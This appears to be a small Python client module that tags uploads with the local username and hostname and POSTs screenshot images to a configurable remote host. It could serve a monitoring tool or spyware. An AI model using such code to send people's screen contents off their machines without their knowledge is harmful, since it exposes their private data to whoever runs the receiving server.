import requests
import getpass
import socket

username = getpass.getuser()
hostname = socket.gethostname()


def send_screenshot(host_url, monitor_num, image_bytes):
    url = f"http://{host_url}/{username}_{hostname}/{monitor_num}/upload"
    try:
        files = {
            "screenshot": (f"screen.webp", image_bytes, "image/webp"),
        }
        resp = requests.post(url, files=files, timeout=10)
        status = resp.status_code
        print(f"Status code {status}")
        return status == 200
    except requests.RequestException:
        return False
